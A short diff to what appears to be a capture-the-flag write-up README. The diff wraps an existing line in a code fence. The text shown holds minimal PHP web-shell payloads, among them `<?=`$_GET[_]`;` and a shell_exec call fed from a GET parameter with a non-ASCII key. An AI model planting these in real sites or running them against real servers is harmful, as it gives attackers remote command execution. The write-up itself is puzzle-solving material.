@@ -24,7 +24,9 @@ string because of non-ascii characters.
  * `{$_GET["\xa0"]}` <-> shell_exec($_GET["\xa0"])
  
 This is only 5 bytes longer than the shortest PHP shell (using $_GET to smuggle data)! 
- <?=`$_GET[_]`;
+``` 
+<?=`$_GET[_]`;
+```
   
 This is a slightly improved idea that I had 2 years ago
 https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2
